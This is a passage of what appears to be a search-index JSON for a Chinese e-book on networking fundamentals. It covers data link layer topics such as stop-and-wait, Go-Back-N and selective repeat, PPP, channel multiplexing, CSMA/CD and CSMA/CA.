<p>\u4e3b\u8981\u4f7f\u7528\u4e0b\u9762\u4e09\u79cd\u673a\u5236\uff0c\u5b9e\u73b0\u53ef\u9760\u4f20\u8f93\u3002\u4e0b\u9762\u4e09\u4e2a\u4f20\u8f93\u65b9\u5f0f\u7684\u539f\u7406\uff0c\u53ef\u4ee5\u5e94\u7528\u5230\u8ba1\u7b97\u673a\u7f51\u7edc\u4f53\u7cfb\u4e2d\u5404\u5c42\u534f\u8bae\u4e2d\u3002</p>"},{"location":"ebook-network-basic/03%20%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#p25-342-sw","title":"P25 3.4.2 \u53ef\u9760\u4f20\u8f93\u7684\u5b9e\u73b0\u673a\u5236 \u2014 \u505c\u6b62-\u7b49\u5f85\u534f\u8bae\uff08SW\uff09","text":"<p>\u505c\u6b62\u7b49\u5f85\u534f\u8bae\uff1astop and wait</p> <p>\u53d1\u9001\u65b9\u53d1\u9001\u6570\u636e\u540e\uff0c\u4e0d\u80fd\u76f4\u63a5\u5220\u9664\u8fd9\u4e2a\u6570\u636e\u3002\u9700\u8981\u7b49\u5f85\u63a5\u6536\u65b9\u8fd4\u56de\u5df2\u7ecf\u6210\u529f\u63a5\u6536\u7684\u6d88\u606f\uff0c\u7136\u540e\u53d1\u9001\u65b9\u624d\u80fd\u5220\u9664\u6570\u636e\u3002\u5982\u679c\u59cb\u7ec8\u6ca1\u6709\u63a5\u6536\u5230\u63a5\u6536\u65b9\u7684\u4fe1\u606f\uff0c\u90a3\u4e48\u5c31\u89e6\u53d1\u8d85\u65f6\u91cd\u4f20\u3002\u8fd9\u6837\uff0c\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u8bef\u7801\uff0c\u6216\u8005\u5206\u7ec4\u672a\u88ab\u63a5\u6536\u65f6\uff0c\u90fd\u53ef\u4ee5\u518d\u6b21\u6b63\u786e\u83b7\u53d6\u6570\u636e\u3002</p> <p>\u8d85\u65f6\u91cd\u4f20\u65f6\u95f4\uff0c\u7565\u5927\u4e8e\u5e73\u5747\u5f80\u8fd4\u65f6\u95f4\uff08\u6570\u636e\u94fe\u8def\u5c42RTT\u8f83\u597d\u8ba1\u7b97\uff0c\u8fd0\u8f93\u5c42\u975e\u5e38\u590d\u6742\uff09</p> <p>\u4e3a\u907f\u514d\u5206\u7ec4\u91cd\u590d\uff0c\u9700\u8981\u7ed9\u6bcf\u4e2a\u5206\u7ec4\u5e26\u4e0a\u5e8f\u53f7\u3002\u6bcf\u6b21\u53d1\u9001\u4e00\u4e2a\u6570\u636e\u5206\u7ec4\uff0c\u5c31\u505c\u6b62\u7b49\u5f85\uff0c\u53ea\u9700\u4fdd\u8bc1\u65b0\u7684\u6570\u636e\u5206\u7ec4\u548c\u4e0a\u4e00\u6b21\u7684\u6570\u636e\u5206\u7ec4\u5e8f\u53f7\u4e0d\u540c\u5373\u53ef\u3002\u4f7f\u7528\u4e00\u4e2a\u6bd4\u7279\u7f16\u53f7\u5c31\u8db3\u591f\u4e86\u3002</p> <p>\u6ce8\u610f\uff1a\u63a5\u6536\u7aef\u6536\u5230\u6570\u636e\u5206\u7ec4\u540e\uff0c\u5982\u679c\u6709\u8bef\u7801\uff0c\u5c06\u5176\u4e22\u5f03\uff0c\u7b49\u5f85\u53d1\u9001\u65b9\u7684\u8d85\u65f6\u91cd\u4f20\u3002\u5982\u679c\u662f\u8bef\u7801\u7387\u8f83\u9ad8\u7684\u70b9\u5bf9\u70b9\u94fe\u8def\uff0c\u4e3a\u4e86\u5c3d\u5feb\u8d85\u65f6\u91cd\u4f20\uff0c\u53ef\u4ee5\u53d1\u51fa NAK \u5206\u7ec4\u3002</p> <p>\u505c\u6b62\u7b49\u5f85\u534f\u8bae\u7684\u4fe1\u9053\u5229\u7528\u7387\uff1aU = Td / (Td + RTT + Ta) </p> <p>Td \u53d1\u9001\u65b9\uff1a\u6570\u636e\u5206\u7ec4\u53d1\u9001\u65f6\u95f4</p> <p>RTT \u5f80\u8fd4\u65f6\u95f4</p> <p>Ta \u63a5\u6536\u65b9\uff1a\u786e\u8ba4\u5206\u7ec4\u7684\u53d1\u9001\u65f6\u95f4\uff08\u5f88\u5c0f\uff09</p> <p>\u6240\u4ee5\uff0c\u5f53 Td / RTT \u8d8a\u5927\uff08\u6570\u636e\u4f20\u8f93\u91cf\u8d8a\u5927\uff0c\u6216\u8005\u5f80\u8fd4\u65f6\u95f4\u8d8a\u77ed\uff09\uff0c\u4fe1\u9053\u5229\u7528\u7387\u8d8a\u9ad8</p> <p>\u5982\u679c RTT \u8f83\u5927\uff08\u536b\u661f\u94fe\u8def\uff09\uff0c\u4fe1\u9053\u5229\u7528\u7387\u975e\u5e38\u4f4e\uff1b\u5982\u679c\u8d85\u65f6\u91cd\u4f20\uff0cU \u8fd8\u8981\u964d\u4f4e\u3002</p>"},{"location":"ebook-network-basic/03%20%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#p26-343-ngbn","title":"P26 3.4.3 \u53ef\u9760\u4f20\u8f93\u7684\u5b9e\u73b0\u673a\u5236 \u2014 \u56de\u9000N\u5e27\u534f\u8bae\uff08GBN\uff09","text":"<p>\u56de\u9000N\u5e27\u534f\u8bae\uff0c\u4e5f\u6210\u4e3a\u6ed1\u52a8\u7a97\u53e3\u534f\u8bae</p> <p>\u505c\u6b62\u7b49\u5f85\u534f\u8bae\u7684\u4fe1\u9053\u5229\u7528\u7387\u5f88\u4f4e\uff0c\u6240\u4ee5\u63d0\u51fa\u4e86\u56de\u9000N\u5e27\u534f\u8bae\uff08\u6d41\u6c34\u7ebf\u4f20\u8f93\uff09Go-Back-N</p> <p>\u8bbe\u7f6e\u4e00\u4e2a\u53d1\u9001\u7a97\u53e3\uff08\u6ed1\u52a8\u7a97\u53e3\uff09\uff0c\u53ea\u8981\u5728\u7a97\u53e3\u5185\u7684\u5206\u7ec4\uff0c\u5c31\u53ef\u4ee5\u53d1\u9001\u3002\u8fd9\u6837\u4e00\u6b21\u53ef\u4ee5\u53d1\u9001 N \u4e2a\u5206\u7ec4\u3002\u63a5\u6536\u65b9\u4e0d\u9700\u8981\u5bf9\u5206\u7ec4\u8fdb\u884c\u9010\u4e00\u786e\u8ba4\uff0c\u53ea\u9700\u8981\u5728\u6536\u5230\u5206\u7ec4\u540e\uff0c\u5bf9\u6309\u5e8f\u5230\u5e95\u7684\u6700\u540e\u4e00\u4e2a\u5206\u7ec4\u786e\u8ba4\uff08\u8fd9\u90e8\u5206\u5df2\u7ecf\u6536\u5230\uff0c\u53ef\u4ee5\u5220\u9664\u4e86\uff0cACKn \u8868\u793a N \u4e4b\u524d\u5168\u90e8\u6570\u636e\u5206\u7ec4\u90fd\u6b63\u5e38\u63a5\u6536\uff09\u3002\u6216\u8005\u63a5\u6536\u65b9\u5728\u81ea\u5df1\u6709\u5206\u7ec4\u53d1\u9001\u65f6\uff08\u5168\u53cc\u5de5\uff09\uff0c\u5bf9\u5df2\u63a5\u6536\u65e0\u8bef\u7801\u7684\u5206\u7ec4\uff0c\u8fdb\u884c\u634e\u5e26\u786e\u8ba4\u3002</p> <p>\u5982\u679c\u67d0\u4e2a\u5206\u7ec4\u51fa\u73b0\u5dee\u9519\uff0c\u63a5\u6536\u65b9\u7684 ACKn \u4f1a\u91cd\u590d\u53d1\u9001\uff0c\u53d1\u9001\u65b9\u5c31\u77e5\u9053\u51fa\u73b0\u4e86\u5dee\u9519\uff0c\u4e0d\u9700\u8981\u7b49\u8d85\u65f6\u8ba1\u65f6\u5668\u5c31\u53ef\u4ee5\u7acb\u5373\u91cd\u4f20\u3002\u5177\u4f53\u6536\u5230\u51e0\u4e2a ACKn \u6839\u636e\u5177\u4f53\u60c5\u51b5\u51b3\u5b9a\u3002\u5982\u679c\u7b2cN\u4e2a\u51fa\u73b0\u91cd\u4f20\uff0c\u90a3\u4e48\u540e\u9762\u5df2\u53d1\u9001\u7684\u5206\u7ec4\uff0c\u90fd\u9700\u8981\u91cd\u4f20\u3002</p> <p>\u5982\u679c\u7ebf\u8def\u901a\u4fe1\u8d28\u91cf\u4e0d\u597d\uff0cGBN \u534f\u8bae\u7684\u4fe1\u9053\u5229\u7528\u7387\u5e76\u4e0d\u6bd4 SW \u534f\u8bae\u9ad8\u3002</p> <p>\u53d1\u9001\u7a97\u53e3\u7684\u5c3a\u5bf8\uff08\u4f8b\u59825\uff09\uff0c\u4e0d\u80fd\u8d85\u8fc7\u5206\u7ec4\u7684\u5e8f\u53f7\uff08\u4f8b\u59820-8\uff0c\u8d85\u8fc78\u540e\uff0c\u5206\u7ec4\u5e8f\u53f7\u518d\u4ece0\u5f00\u59cb\uff09\u3002\u5982\u679c\u8d85\u8fc7\uff0810\uff09\uff0c\u90a3\u4e48\u53ef\u80fd\u540c\u65f6\u63a5\u6536\u52301\uff0c\u51fa\u73b0\u9519\u8bef\u3002</p>"},{"location":"ebook-network-basic/03%20%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#p27-344-sr","title":"P27 3.4.4 \u53ef\u9760\u4f20\u8f93\u7684\u5b9e\u73b0\u673a\u5236 \u2014 \u9009\u62e9\u91cd\u4f20\u534f\u8bae\uff08SR\uff09","text":"<p>\u56de\u9000N\u5e27\u534f\u8bae\u4e2d\uff0c\u63a5\u6536\u7a97\u53e3\u5c3a\u5bf8\u662f1\uff0c\u63a5\u6536\u65b9\u53ea\u80fd\u63a5\u6536\u6309\u5e8f\u5230\u8fbe\u7684\u6b63\u786e\u5206\u7ec4\u3002\u5982\u679c\u67d0\u4e2a\u5206\u7ec4\u8bef\u7801\uff0c\u4f1a\u9020\u6210\u540e\u7eed\u591a\u4e2a\u6570\u636e\u5206\u7ec4\uff0c\u4e0d\u80fd\u88ab\u63a5\u6536\u65b9\u63a5\u6536\u5e76\u4e22\u5f03\uff0c\u53d1\u9001\u65b9\u4e5f\u9700\u8981\u5bf9\u8fd9\u90e8\u5206\u6570\u636e\u5206\u7ec4\u8d85\u65f6\u91cd\u4f20\uff0c\u4fe1\u9053\u5229\u7528\u7387\u964d\u4f4e</p> <p>\u9009\u62e9\u91cd\u4f20\u534f\u8bae\uff0c\u63a5\u6536\u7a97\u53e3\u7684\u5c3a\u5bf8\u662fN\uff0c\u8fd9\u6837\u53ef\u4ee5\u5148\u6536\u4e0b\u5931\u5e8f\u5230\u8fbe\u4e14\u65e0\u8bef\u7801\uff0c\u5e76\u4e14\u5e8f\u53f7\u5728\u63a5\u6536\u7a97\u53e3\u4e2d\u7684\u6570\u636e\u5206\u7ec4\uff0c\u7b49\u5168\u90e8\u5206\u7ec4\u5230\u8fbe\u540e\uff0c\u4e00\u8d77\u4ea4\u7ed9\u4e0a\u5c42\uff08selective request\uff09</p> <p>\u4e3a\u4e86\u4f7f\u53d1\u9001\u65b9\u4ec5\u91cd\u4f20\u51fa\u9519\u7684\u5206\u7ec4\uff0c\u63a5\u6536\u65b9\u4e0d\u662f\u7d2f\u8ba1\u786e\u8ba4\uff0c\u800c\u662f\u5bf9\u6bcf\u4e00\u4e2a\u6b63\u786e\u63a5\u6536\u5230\u7684\u6570\u636e\u5206\u7ec4\uff0c\u6bcf\u4e00\u4e2a\u8fdb\u884c\u786e\u8ba4\u3002</p> <p>\u63a5\u6536\u65b9\u7684\u63a5\u6536\u7a97\u53e3\u5c3a\u5bf8\uff0c\u9700\u8981\u5c0f\u4e8e\u53d1\u9001\u65b9\u7684\u53d1\u9001\u7a97\u53e3\uff08\u5982\u679c\u7b49\u4e8e1\uff0c\u5c31\u662f\u505c\u6b62\u7b49\u5f85\u534f\u8bae\uff1b\u5982\u679c\u5927\u4e8e\u53d1\u9001\u7a97\u53e3\uff0c\u90a3\u4e48\u6ca1\u6709\u610f\u4e49\uff0c\u6d6a\u8d39\u5185\u5b58\uff09\u3002</p> <p>\u63a5\u6536\u65b9\u63a5\u6536\u5230\u6309\u5e8f\u5230\u8fbe\u7684\u6570\u636e\u5206\u7ec4\u540e\uff0c\u7a97\u53e3\u5411\u524d\u6ed1\u52a8\u3002</p>"},{"location":"ebook-network-basic/03%20%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#p28-35-ppp","title":"P28 3.5 \u70b9\u5bf9\u70b9\u534f\u8baePPP","text":"<p>\u70b9\u5bf9\u70b9\u534f\u8baePPP\uff0c\u662f\u6570\u636e\u94fe\u8def\u5c42\u4f7f\u7528\u6700\u5e7f\u6cdb\u7684\u70b9\u5bf9\u70b9\u534f\u8bae\uff0c\u5177\u4f53\u5206\u6210\u4e09\u90e8\u5206\uff1a</p> <ul> <li>\u4e0b\u5c42\u7684\u94fe\u8def\u901a\u77e5\u534f\u8bae LCP\uff0c\u8d1f\u8d23\u5efa\u7acb\u914d\u7f6e\u6d4b\u8bd5\u6570\u636e\u94fe\u8def\u7684\u8fde\u63a5\uff08\u5bf9\u63a5\u7269\u7406\u5c42\uff0c\u4f8b\u5982\u9762\u5411\u6bd4\u7279\u6216\u5b57\u8282\u7684\u94fe\u8def\uff09</li> <li>\u4e2d\u95f4\u7684\u5c01\u88c5\u6210\u5e27\uff08\u5bf9\u5404\u79cd\u6570\u636e\u62a5\u7684\u5c01\u88c5\uff09</li> <li>\u4e0a\u5c42\u7684 NCPs \uff0c\u652f\u6301\u4e0d\u540c\u7684\u7f51\u7edc\u5c42\u534f\u8bae\uff08IP\uff0cIPX \u7b49\u534f\u8bae\uff09</li> </ul> <p>\u6240\u4ee5\u5408\u6210\u4e3a PPP \u534f\u8bae</p> <p>\u534f\u8bae\u7684\u5e27\u683c\u5f0f</p> <ul> <li>\u9996\u90e8\uff1a\u5b9a\u754c\u7b26\uff1b\u5730\u5740\uff1b\u63a7\u5236\uff1b\u534f\u8bae\uff08\u6570\u636e\u90e8\u5206\u4ea4\u7ed9\u4ec0\u4e48\u534f\u8bae\u5904\u7406\uff09</li> <li>\u6570\u636e\uff1a\u5982\u679c\u5185\u90e8\u6709\u7279\u6b8a\u5b57\u7b26\uff08\u548c\u5b9a\u754c\u7b26\u51b2\u7a81\uff09\uff0c\u9700\u8981\u8f6c\u4e49</li> <li>\u5c3e\u90e8\uff1a\u5e27\u68c0\u9a8c\u5e8f\u5217\uff08FCS\uff0c\u63a5\u6536\u65b9\u6536\u5230PPP\u5e27\u540e\uff0c\u4f7f\u7528CRC\u6821\u9a8c\uff0c\u5982\u679c\u6b63\u786e\uff0c\u6536\u4e0b\u8fd9\u4e2a\u5e27\uff1b\u5982\u679c\u4e0d\u6b63\u786e\uff0c\u4e22\u5f03\u8fd9\u4e2a\u5e27\uff1b\u4f7f\u7528PPP\u6570\u534f\u8bae\u5411\u4e0a\u4e0d\u63d0\u4f9b\u53ef\u9760\u4f20\u8f93\u2014\u2014\u5728\u8fd0\u8f93\u5c42\u5904\u7406\uff09\uff1b\u5b9a\u754c\u7b26</li> </ul> <p>\u63a5\u6536\u65b9\u5148\u53cd\u53d8\u6362\uff08\u5904\u7406\u8f6c\u4e49\u5b57\u7b26\uff09</p> <p>\u900f\u660e\u4f20\u8f93\uff1a\u9762\u5411\u6bd4\u7279\u7684\u540c\u6b65\u94fe\u8def\uff0c\u91c7\u7528\u63d2\u5165\u6bd4\u72790\u7684\u6bd4\u7279\u586b\u5145\u6cd5</p>"},{"location":"ebook-network-basic/03%20%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#p29-361","title":"P29 3.6.1 \u5a92\u4f53\u63a5\u5165\u63a7\u5236\u7684\u57fa\u672c\u6982\u5ff5","text":"<p>\u5a92\u4f53\u63a5\u5165\u63a7\u5236\u89e3\u51b3\u7684\u95ee\u9898\uff1a\u534f\u8c03\u591a\u4e2a\u53d1\u52a8\u548c\u63a5\u6536\u4e3b\u673a\uff0c\u5bf9\u4e00\u4e2a\u5171\u4eab\u5a92\u4f53\u7684\u5360\u7528\uff08MAC medium access control\uff09\uff0c\u4ee5\u53ca\u53d1\u751f\u51b2\u7a81\u540e\uff0c\u5982\u4f55\u5c3d\u5feb\u56de\u590d\u901a\u4fe1\u3002</p> <p>\u53ef\u4ee5\u5206\u4e3a\u9759\u6001\u5212\u5206\u4fe1\u9053\uff08\u4e0d\u7075\u6d3b\uff0c\u7a81\u53d1\u6027\u6570\u636e\u4fe1\u9053\u5229\u7528\u7387\u5f88\u4f4e\uff0c\u65e0\u7ebf\u7f51\u7edc\u7269\u7406\u5c42\u4f7f\u7528\uff0c\u4e0d\u5728\u6570\u636e\u94fe\u8def\u5c42\u4e2d\u4f7f\u7528\uff09\u3001\u52a8\u6001\u63a5\u5165\u63a7\u5236\uff08\u5171\u4eab\u5f0f\u4ee5\u592a\u7f51\uff09\u3002</p> <p>\u968f\u7740\u6280\u672f\u53d1\u5c55\uff0c\u6709\u9650\u7f51\u7edc\uff0c\u70b9\u5bf9\u70b9\u94fe\u8def\u548c\u94fe\u8def\u5c42\u4ea4\u6362\u673a\u7684\u4ea4\u6362\u5f0f\u5c40\u57df\u7f51\uff0c\u53d6\u4ee3\u4e86\u5171\u4eab\u5f0f\u5c40\u57df\u7f51\uff08\u5df2\u7ecf\u4e0d\u4f7f\u7528\u9759\u6001\u63a5\u5165\u63a7\u5236\uff09\u3002\u65e0\u7ebf\u5c40\u57df\u7f51\u4e2d\u8fd8\u4f7f\u7528\u5171\u4eab\u5a92\u4f53\u6280\u672f\u3002</p> <p>\u4e0b\u9762\u4e09\u5c0f\u8282\u8be6\u8ff0</p>"},{"location":"ebook-network-basic/03%20%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#p30-362","title":"P30 3.6.2 \u5a92\u4f53\u63a5\u5165\u63a7\u5236 \u2014 \u9759\u6001\u5212\u5206\u4fe1\u9053","text":"<p>\u4fe1\u9053\u590d\u7528\uff1a\u4e00\u6761\u4fe1\u9053\u4e2d\u4f20\u8f93\u591a\u8def\u7528\u6237\u7684\u4fe1\u53f7\uff08\u4fe1\u9053\u5a92\u4f53\u7684\u4f20\u8f93\u5bb9\u91cf\uff0c\u9700\u8981\u5927\u4e8e\u591a\u6761\u5355\u4e00\u4fe1\u9053\u7684\u603b\u901a\u4fe1\u91cf\uff09\u5728\u53d1\u9001\u6bb5\u5b9e\u73b0\u4e86\u4fe1\u9053\u590d\u7528\uff0c\u63a5\u6536\u7aef\u5b9e\u73b0\u4fe1\u9053\u5206\u7528\u3002</p> <p>\u590d\u7528\uff1a</p> <ul> <li>\u9891\u5206\u590d\u7528\uff08FDM\uff0c\u4f7f\u7528\u4e0d\u540c\u7684\u9891\u7387\u9694\u79bb\u4fe1\u9053\uff09\uff1b</li> <li>\u65f6\u5206\u590d\u7528\uff08TDM\uff0c \u4f7f\u7528\u4e0d\u540c\u7684\u65f6\u5e8f\u590d\u7528\u4fe1\u9053\uff09\uff1b</li> <li>\u6ce2\u5206\u590d\u7528\uff08WDM\uff0c\u5149\u7f06\u4e2d\u4e0d\u540c\u6ce2\u957f\u7684\u5149\u4fe1\u53f7\uff09\uff1b</li> <li>\u7801\u5206\u590d\u7528\uff08CDM\uff0c\u6bcf\u4e00\u4e2a\u6bd4\u7279\u65f6\u95f4\u5212\u5206\u621064\u6216\u8005128\u4e2a\u7801\u7247\uff0c\u6bcf\u4e00\u4e2a\u4e3b\u673a\u4f7f\u7528\u552f\u4e00\u7684\u7801\u7247\u5e8f\u5217\uff0c\u4e0d\u80fd\u76f8\u540c\uff0c\u5fc5\u987b\u6b63\u4ea4\uff0c\u5982\u679c\u53d1\u90011\u5c31\u662f\u8fd9\u4e2a\u7801\u7247\uff0c\u5982\u679c\u53d1\u90010\u5c31\u662f\u7801\u7247\u7684\u8865\u7801\uff1b\u63a5\u6536\u65b9\u6839\u636e\u4e0d\u540c\u7684\u7801\u7247\uff0c\u5f97\u5230\u4e0d\u540c\u7684\u4e3b\u673a\u53d1\u9001\u7684\u4fe1\u606f\uff0c\u7136\u540e\u8fdb\u884c\u89e3\u7801\u8f6c\u7801\u5c31\u53ef\u4ee5\u83b7\u53d6\u6bd4\u7279\u6d41\uff09</li> </ul>"},{"location":"ebook-network-basic/03%20%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#p31-363-csmacd","title":"P31 3.6.3 \u968f\u673a\u63a5\u5165 \u2014 CSMA/CD\u534f\u8bae","text":"<p>CSMA/CD \u534f\u8bae\uff1a</p> <p>\u8f7d\u6ce2\u76d1\u542c\uff08CS\uff09\u5148\u542c\u540e\u8bf4\uff0c\u6bcf\u4e2a\u4e3b\u673a\u53d1\u9001\u524d\uff0c\u5148\u68c0\u6d4b\u603b\u7ebf\u4e0a\u662f\u5426\u5fd9\uff1b\u5982\u679c96\u6bd4\u7279\u65f6\u95f4\u4e0d\u5fd9\uff0c\u53d1\u9001\u8fd9\u4e2a\u5e27\uff1b\u5982\u679c\u5fd9\uff0c\u7b49\u5f85\u76f4\u5230\u603b\u7ebf\u4e0d\u5fd9\u518d\u53d1\u9001</p> <p>\u591a\u5740\u63a5\u5165\uff08MA\uff09\u591a\u4e2a\u4e3b\u673a\u8fde\u63a5\u5728\u4e00\u6761\u603b\u7ebf\u4e0a\uff0c\u7ade\u4e89\u4f7f\u7528\u603b\u7ebf</p> <p>\u78b0\u649e\u68c0\u6d4b\uff08CD\uff09\uff1a\u8fb9\u542c\u8fb9\u8bf4\uff0c\u4e3b\u673a\u53d1\u9001\u6570\u636e\u65f6\uff0c\u4e5f\u8981\u76d1\u542c\u662f\u5426\u53d1\u751f\u78b0\u649e\u3002\u5982\u679c\u53d1\u751f\u78b0\u649e\uff0c\u505c\u6b62\u4e00\u6bb5\u65f6\u95f4\u540e\u518d\u6b21\u53d1\u9001</p> <p>\u5f3a\u5316\u78b0\u649e\uff1a\u5982\u679c\u4e00\u4e2a\u53d1\u9001\u7aef\u68c0\u6d4b\u5230\u53d1\u751f\u4e86\u78b0\u649e\uff0c\u81ea\u5df1\u7acb\u523b\u505c\u6b62\u53d1\u9001\uff0c\u540c\u65f6\u518d\u53d1\u9001\u4e00\u4e2a\u78b0\u649e\u4fe1\u53f7\uff0c\u4ee5\u4fbf\u5176\u4ed6\u7684\u7ad9\u70b9\u68c0\u6d4b\u5230\u78b0\u649e\u7684\u53d1\u751f\u3002</p> <p>\u78b0\u649e\u7a97\u53e3\uff08\u4e89\u7528\u603b\u7ebf\u7684\u65f6\u671f\uff09\u4ee5\u592a\u7f51\u7aef\u5230\u7aef\u7684RTT\u65f6\u5ef62t\uff08\u6700\u591a\u7ecf\u8fc72t\u65f6\u95f4\uff0c\u5c31\u53ef\u4ee5\u68c0\u6d4b\u5230\u662f\u5426\u53d1\u751f\u4e86\u78b0\u649e\uff09\u4e3b\u673a\u9700\u8981\u7ecf\u8fc7\u78b0\u649e\u7a97\u53e3\u65f6\u95f4\u540e\uff0c\u624d\u80fd\u77e5\u9053\u8fd9\u6b21\u53d1\u9001\u4e0d\u4f1a\u53d1\u751f\u78b0\u649e\u3002</p> <p>\u4ee5\u592a\u7f51\u4e2d\u53d1\u9001\u5e27\u7684\u4e3b\u673a\u8d8a\u591a\uff0c\u65f6\u5ef6\u8d8a\u5927\uff0c\u53d1\u751f\u78b0\u649e\u7684\u6982\u7387\u589e\u52a0\u3002\u5171\u4eab\u5f0f\u4ee5\u592a\u7f51\u4e0d\u80fd\u8fde\u63a5\u592a\u591a\u7684\u4e3b\u673a\uff0c\u603b\u7ebf\u4e0d\u80fd\u592a\u957f\u3002</p> <p>\u6700\u5c0f\u5e27\u957f\uff1a\u786e\u4fdd\u4e3b\u673a\u5728\u5e27\u53d1\u9001\u5b8c\u6210\u4e4b\u524d\uff0c\u5c31\u68c0\u6d4b\u5230\u5e27\u53d1\u9001\u8fc7\u7a0b\u4e2d\uff0c\u662f\u5426\u4ea7\u751f\u4e86\u78b0\u649e\u3002\uff08\u4ee5\u592a\u7f51\u89c4\u5b9a\u6700\u5c0f\u5e27\u957f\u662f64\u5b57\u8282\uff09\u63a5\u6536\u65b9\u6536\u5230\u7684\u5e27\u4e2d\uff0c\u51e1\u662f\u957f\u5ea6\u5c0f\u4e8e64 \u5b57\u8282\u7684\u5e27\uff0c\u90fd\u662f\u78b0\u649e\u9020\u6210\u7684\u65e0\u6548\u5e27\u3002</p> <p>\u4fe1\u9053\u5229\u7528\u7387\uff1a\u548c\u4fe1\u9053\u957f\u5ea6\u6210\u53cd\u6bd4\uff0c\u548c\u5e27\u957f\u5ea6\u6210\u6b63\u6bd4\u3002</p> <p>\u5e27\u63a5\u6536\u7aef\u6d41\u7a0b\uff1a\u68c0\u6d4b\u5e27\u957f\u5ea6\u5927\u4e8e\u6700\u77ed\u5e27\u957f\uff1b\u68c0\u6d4b\u76ee\u7684MAC\u5730\u5740\u548c\u63a5\u6536\u65b9\u7684\u5730\u5740\u662f\u5426\u76f8\u540c\uff08\u6216\u8005\u662f\u5e7f\u64ad\u5e27\uff09\uff1b\u4f7f\u7528CRC\u68c0\u67e5\u5e27\u5224\u65ad\u662f\u5426\u8bef\u7801</p> <p>\u4e60\u9898\uff1aCSMA-CD\u534f\u8bae\u4e2d\uff0c\u8fb9\u53d1\u9001\u5e27\uff0c\u8fb9\u68c0\u6d4b\u662f\u5426\u51b2\u7a81\uff1b\u9002\u5e94\u4e8e\u6709\u7ebf\u7f51\u7edc\uff1b\u6839\u636e\u7f51\u7edc\u8de8\u5ea6\uff08RTT\uff09\u548c\u6570\u636e\u4f20\u8f93\u901f\u7387\u9650\u5236\u6700\u5c0f\u5e27\u957f\u3002\u5f53RTT\u8d8b\u8fd1\u4e8e0\uff0c\u4fe1\u9053\u5229\u7528\u4e0e\u8d8b\u8fd1\u4e8e100%\u3002</p>"},{"location":"ebook-network-basic/03%20%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#p32-364-csmaca","title":"P32 3.6.4 \u968f\u673a\u63a5\u5165\u2014 CSMA/CA\u534f\u8bae","text":"<p>\u65e0\u7ebf\u5c40\u57df\u7f51\u4f7f\u7528 CSMA-CA \u534f\u8bae\uff08CA \u78b0\u649e\u907f\u514d\uff09</p> <p>\u4e3a\u4ec0\u4e48\u65e0\u7ebf\u7f51\u4e0d\u80fd\u4f7f\u7528CD\u78b0\u649e\u68c0\u6d4b\u534f\u8bae\uff1f\u56e0\u4e3a\u65e0\u7ebf\u4fe1\u53f7\u5bb9\u6613\u88ab\u5e72\u6270\uff0c\u63a5\u6536\u5f3a\u5ea6\u8fdc\u5c0f\u4e8e\u53d1\u9001\u5f3a\u5ea6\u3002\u5982\u679c\u5728\u65e0\u7ebf\u7f51\u5361\u5b9e\u73b0CD\uff0c\u5bf9\u786c\u4ef6\u8981\u6c42\u5f88\u9ad8\u3002\u540c\u65f6\uff0c\u65e0\u7ebf\u5c40\u57df\u7f51\u53ef\u80fd\u5b58\u5728\u9690\u853d\u7ad9\u95ee\u9898\uff08ABC\u5e76\u4e0d\u80fd\u5b8c\u5168\u4fe1\u53f7\u8986\u76d6\uff0c\u6240\u4ee5\u78b0\u649e\u68c0\u6d4b\u610f\u4e49\u4e0d\u5927\uff09</p> <p>802.11 \u65e0\u7ebf\u5c40\u57df\u7f51\uff1a\u65e0\u7ebf\u4fe1\u9053\u8bef\u7801\u7387\u8f83\u9ad8\uff08\u6570\u636e\u94fe\u8def\u5c42\u5b9e\u73b0\u4e86\u786e\u8ba4\u673a\u5236\uff0c\u505c\u6b62\u7b49\u5f85\u534f\u8bae\uff09\u589e\u52a0\u4e86\u78b0\u649e\u907f\u514d\u529f\u80fd\uff08CA\uff09\u5177\u4f53\u4f7f\u7528DCF\u7b97\u6cd5\u5b9e\u73b0\u3002</p> <p>\u6240\u6709\u7ad9\u70b9\uff0c\u5fc5\u987b\u5728\u6301\u7eed\u68c0\u6d4b\u5230\u4fe1\u9053\u7a7a\u95f2\u4e00\u6bb5\u65f6\u95f4\u540e\uff08IFS\uff0c\u5e27\u95f4\u95f4\u9694\uff09\uff0c\u624d\u80fd\u53d1\u9001\u5e27\u3002\u5e27\u5206\u4e3a\u9ad8\u4f18\u5148\u7ea7\u548c\u4f4e\u4f18\u5148\u7ea7\uff0c\u9ad8\u4f18\u5148\u7ea7\u7684IFS\u8f83\u77ed\uff0c\u4f18\u5148\u53d1\u9001\u3002</p> <p>\u9000\u907f\u7b97\u6cd5\uff1a\u4fe1\u9053\u7531\u5fd9\uff0c\u53d8\u6210\u95f2\uff0c\u7ecf\u8fc7DIFS\u65f6\u95f4\u540e\uff0c\u8fd8\u8981\u7ecf\u8fc7\u4e00\u6bb5\u968f\u673a\u4e8b\u4ef6\uff0c\u624d\u80fd\u4f7f\u7528\u4fe1\u9053\uff08\u907f\u514d\u4e00\u4e2a\u7ad9\u70b9\u957f\u65f6\u95f4\u5360\u7528\u4fe1\u9053\uff09\u6216\u8005\u6570\u636e\u91cd\u4f20</p> <p>\u4e09\u4e2a\u540d\u8bcd</p> <ul> <li>mac \u5730\u5740\uff1a\u6570\u636e\u94fe\u8def\u5c42\uff0c\u4ee5\u592a\u7f51\u4e2dMAC\u5b50\u5c42\u4f7f\u7528\u7684\u5730\u5740\uff08\u7269\u7406\u5730\u5740\uff09</li> <li>ip \u5730\u5740\uff1a\u7f51\u7edc\u5c42\u4e2d\uff0cTCP/IP \u4f53\u7cfb\u4e2d\uff0c\u4f7f\u7528\u7684\u5730\u5740</li> <li>ARP \u534f\u8bae\uff1a\u7f51\u7edc\u5c42\uff0c\u901a\u8fc7IP\u5730\u5740\u83b7\u53d6\u5230\u4e3b\u673a\u7684MAC\u5730\u5740\u7684\u534f\u8bae</li> 